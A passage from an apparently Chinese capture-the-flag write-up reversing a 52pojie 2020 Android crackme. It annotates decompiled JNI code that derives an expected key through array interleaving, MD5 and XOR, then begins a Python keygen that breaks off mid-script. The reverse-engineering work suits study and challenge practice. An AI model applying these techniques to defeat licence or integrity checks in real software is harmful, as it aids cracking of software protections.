class="number">35</span>,</span><br><span class="line">    <span class="string">"52pojie_2020_happy_chinese_new_year20200125"</span>);<span class="comment">// key2 = "52pojie_2020_happy_chinese_new_year"</span></span><br><span class="line">  key3 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">signed</span> <span class="keyword">int</span>))env_-&gt;functions-&gt;NewByteArray)(env_, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, _DWORD, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">char</span> *))env_-&gt;functions-&gt;SetByteArrayRegion)(</span><br><span class="line">      env_,</span><br><span class="line">      key3,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">8</span>,</span><br><span class="line">      <span class="string">"20200125"</span>);                          <span class="comment">// key3 = "20200125"</span></span><br></pre></td></tr></table></figure><p>然后新建了一个 35 位的 Byte 数组，做一个循环，当 i 不为 0 且 i 是 4 的倍数时，下标设置为 <code>(i &gt;&gt; 2) - 1</code>，取 key3 中的值来 append 到数组中；反之，下标设置为 i，取 key2 中的值来 append 到数组中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">        arr = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">signed</span> <span class="keyword">int</span>))env_-&gt;functions-&gt;NewByteArray)(env_, <span class="number">35</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">        &#123;</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">          arr_ = arr;</span><br><span class="line">          key1_ = key1;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !i || i &amp; <span class="number">3</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( !key2 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">              pointer = key2;</span><br><span class="line">              i_ = i;</span><br><span class="line">              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                                <span class="comment">// if i != 0 and i % 4 == 0</span></span><br><span class="line">            &#123;</span><br><span class="line">              pointer = key3;</span><br><span class="line">              <span class="keyword">if</span> ( !key3 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_41;</span><br><span class="line">              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;</span><br><span class="line">              i_ = (i &gt;&gt; <span class="number">2</span>) - <span class="number">1</span>;                <span class="comment">// 0,1,2,3,4,5,6,7</span></span><br><span class="line">            &#125;</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>))GetByteArrayRegion_)(</span><br><span class="line">              env_,</span><br><span class="line">              pointer,</span><br><span class="line">              i_,</span><br><span class="line">              <span class="number">1</span>,</span><br><span class="line">              t1);</span><br><span class="line">            key1 = (<span class="keyword">unsigned</span> __int8)t_;</span><br><span class="line">            <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">            <span class="keyword">if</span> ( !arr_ )</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_41:</span><br><span class="line">              sub_4EC0(env_, <span class="string">"java/lang/NullPointerException"</span>, <span class="string">"NullPointerException"</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">            &#125;</span><br><span class="line">            LOBYTE(t_) = key1;</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>))env_-&gt;functions-&gt;SetByteArrayRegion)(</span><br><span class="line">              env_,</span><br><span class="line">              arr_,</span><br><span class="line">              i,</span><br><span class="line">              <span class="number">1</span>,</span><br><span class="line">              t1);</span><br><span class="line">            <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( i++ &lt; <span class="number">0x22</span> );                 <span class="comment">// for i in range(35)</span></span><br></pre></td></tr></table></figure><p>接下来对 byte 数组进行 MD5 哈希，然后取摘要生成 16 位的 byte 数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">          md5Str = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">const</span> <span class="keyword">char</span> *))env_-&gt;functions-&gt;NewStringUTF)(env_, <span class="string">"MD5"</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v47 )</span><br><span class="line">          &#123;</span><br><span class="line">            method2.name = <span class="string">"getInstance"</span>;</span><br><span class="line">            method2.signature = <span class="string">"(Ljava/lang/String;)Ljava/security/MessageDigest;"</span>;</span><br><span class="line">            <span class="keyword">if</span> ( getMethods(env_, &amp;v52, &amp;v47, <span class="number">1</span>, <span class="string">"java/security/MessageDigest"</span>, method2) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          t_ = md5Str;</span><br><span class="line">          v18 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v52);<span class="comment">// md5 function</span></span><br><span class="line">          <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          <span class="keyword">if</span> ( md5Str )</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, md5Str);</span><br><span class="line">          <span class="keyword">if</span> ( !v18 )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_87:</span><br><span class="line">            sub_4EC0(env_, <span class="string">"java/lang/NullPointerException"</span>, <span class="string">"NullPointerException"</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( !v46 )</span><br><span class="line">          &#123;</span><br><span class="line">            method2.name = <span class="string">"digest"</span>;</span><br><span class="line">            method2.signature = <span class="string">"([B)[B"</span>;</span><br><span class="line">            <span class="keyword">if</span> ( getMethods(env_, &amp;v52, &amp;v46, <span class="number">0</span>, <span class="string">"java/security/MessageDigest"</span>, method2) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          t_ = arr_;</span><br><span class="line">          md5Digest = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v18);<span class="comment">// get hash digest</span></span><br><span class="line">          <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v18);</span><br><span class="line">          <span class="keyword">if</span> ( !md5Digest )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br></pre></td></tr></table></figure><p>然后做一个循环，对数组中的元素和 key1 进行逐位异或：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">len = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )                           <span class="comment">// for i in range(16)</span></span><br><span class="line">&#123;</span><br><span class="line">  t1 = <span class="number">0x38E38E39</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &gt;&gt; <span class="number">32</span>;<span class="comment">// div 9? useless</span></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= len )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">int</span> *))env_-&gt;functions-&gt;GetByteArrayRegion)(</span><br><span class="line">    env_,</span><br><span class="line">    md5Digest,</span><br><span class="line">    idx,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    &amp;t_);</span><br><span class="line">  key1 = (<span class="keyword">unsigned</span> __int8)t_;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">  <span class="keyword">if</span> ( !key1_ )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">int</span> *))env_-&gt;functions-&gt;GetByteArrayRegion)(</span><br><span class="line">    env_,</span><br><span class="line">    key1_,</span><br><span class="line">    idx % <span class="number">9u</span>,                         <span class="comment">// mod 9</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    &amp;t_);</span><br><span class="line">  ch = t_;</span><br><span class="line">  <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(t_) = ch ^ key1;           <span class="comment">// xor</span></span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">int</span> *))env_-&gt;functions-&gt;SetByteArrayRegion)(</span><br><span class="line">      env_,</span><br><span class="line">      md5Digest,</span><br><span class="line">      idx,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      &amp;t_);</span><br><span class="line">    <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">    &#123;</span><br><span class="line">      len = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);</span><br><span class="line">      ++idx;</span><br><span class="line">      <span class="keyword">if</span> ( !((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，将得到的 byte 数组逐位转成 hex 字符串，如果小于 0xF，即只有一位，高位补 0。将结果逐位 append 到一个新的字符串中，得到一个 32 位的字符串：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">len__ = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_88;</span><br><span class="line"><span class="keyword">if</span> ( len__ &gt;= <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  classInteger = <span class="string">"java/lang/Integer"</span>;</span><br><span class="line">  toHexString_ = <span class="string">"toHexString"</span>;</span><br><span class="line">  method2.fnPtr = <span class="string">"(I)Ljava/lang/String;"</span>;</span><br><span class="line">  zeroPad = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">int</span> *))env_-&gt;functions-&gt;GetByteArrayRegion)(</span><br><span class="line">      env_,</span><br><span class="line">      md5Digest,</span><br><span class="line">      j,</span><br><span class="line">      <span class="number">1</span>,</span><br><span class="line">      &amp;t_);</span><br><span class="line">    t1 = (<span class="keyword">unsigned</span> __int8)t_;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( t1 &lt;= <span class="number">0xF</span> )                  <span class="comment">// if x &lt; 0xF then append a zero</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( zeroPad )</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, zeroPad);</span><br><span class="line">      zeroPad = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">const</span> <span class="keyword">char</span> *))env_-&gt;functions-&gt;NewStringUTF)(env_, <span class="string">"0"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v44 )</span><br><span class="line">      &#123;</span><br><span class="line">        method2.name = <span class="string">"append"</span>;</span><br><span class="line">        method2.signature = <span class="string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>;</span><br><span class="line">        <span class="keyword">if</span> ( getMethods(env_, &amp;v51, &amp;v44, <span class="number">0</span>, <span class="string">"java/lang/StringBuilder"</span>, method2) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      t_ = zeroPad;</span><br><span class="line">      v24 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);<span class="comment">// append zero</span></span><br><span class="line">      <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v24 )</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v24);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;method2.name = __PAIR__((<span class="keyword">unsigned</span> <span class="keyword">int</span>)method2.fnPtr, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)toHexString_);</span><br><span class="line">      <span class="keyword">if</span> ( getMethods(env_, &amp;v50, &amp;v43, <span class="number">1</span>, classInteger, method2) )<span class="comment">// get toHexString method</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t_ = t1;</span><br><span class="line">    t1 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v50);</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( arr_ )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, arr_);</span><br><span class="line">    <span class="keyword">if</span> ( !v44 )</span><br><span class="line">    &#123;</span><br><span class="line">      method2.name = <span class="string">"append"</span>;</span><br><span class="line">      method2.signature = <span class="string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getMethods(env_, &amp;v51, &amp;v44, <span class="number">0</span>, <span class="string">"java/lang/StringBuilder"</span>, method2) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t_ = t1;</span><br><span class="line">    key1 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( key1 )</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, key1);</span><br><span class="line">    ++j;</span><br><span class="line">    arr_ = t1;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= len__ )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后将取字符串字符串的 1~31 位作为新的字符串，并与我们的输入进行比较：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !v42 )</span><br><span class="line">          &#123;</span><br><span class="line">            method2.name = <span class="string">"toString"</span>;</span><br><span class="line">            method2.signature = <span class="string">"()Ljava/lang/String;"</span>;</span><br><span class="line">            <span class="keyword">if</span> ( getMethods(env_, &amp;v51, &amp;v42, <span class="number">0</span>, <span class="string">"java/lang/StringBuilder"</span>, method2) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          v25 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);<span class="comment">// convert StringBuilder to string</span></span><br><span class="line">          <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v22);</span><br><span class="line">          <span class="keyword">if</span> ( !v25 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">          <span class="keyword">if</span> ( !v41 )</span><br><span class="line">          &#123;</span><br><span class="line">            method2.name = <span class="string">"substring"</span>;</span><br><span class="line">            method2.signature = <span class="string">"(II)Ljava/lang/String;"</span>;</span><br><span class="line">            <span class="keyword">if</span> ( getMethods(env_, &amp;v49, &amp;v41, <span class="number">0</span>, <span class="string">"java/lang/String"</span>, method2) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          v55 = <span class="number">31</span>;                             <span class="comment">// slice 1-31</span></span><br><span class="line">          t_ = <span class="number">1</span>;</span><br><span class="line">          v26 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v25);</span><br><span class="line">          <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v25);</span><br><span class="line">          <span class="keyword">if</span> ( !v26 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">          <span class="keyword">if</span> ( !v40 )</span><br><span class="line">          &#123;</span><br><span class="line">            method2.name = <span class="string">"equals"</span>;</span><br><span class="line">            method2.signature = <span class="string">"(Ljava/lang/Object;)Z"</span>;</span><br><span class="line">            <span class="keyword">if</span> ( getMethods(env_, &amp;v49, &amp;v40, <span class="number">0</span>, <span class="string">"java/lang/String"</span>, method2) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_88;</span><br><span class="line">          &#125;</span><br><span class="line">          t_ = v39;</span><br><span class="line">          v6 = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v26);<span class="comment">// compare string</span></span><br><span class="line">          <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_88;</span><br></pre></td></tr></table></figure><p>只需要正向地实现就能得到对应的字符串，我这里用 Python 实现了一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">key = <span class="string">'thisiskey52pojie_2020_happy_chinese_new_year20200125'</span></span><br><span class="line">key1 = key[:<span class="number">0x7D</span><span class="number">-0x74</span>]</span><br><span class="line">key2 = key[<span class="number">0x7D</span><span class="number">-0x74</span>:<span class="number">0xA0</span><span class="number">-0x74</span>]</span><br><span class="line">key3 = key[<span class="number">0xA0</span><span class="number">-0x74</span>:]</span><br><span class="line"></span><br><span class="line">arr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">or</span> i &amp; <span class="number">3</span>:</span><br><span class="line">        arr += key2[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        arr += key3[(i &gt;&gt; <span class="number">2</span>) - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"></span><br><span class="line">md5str = hashlib.md5(arr).digest()</span><br><span class="line"><span 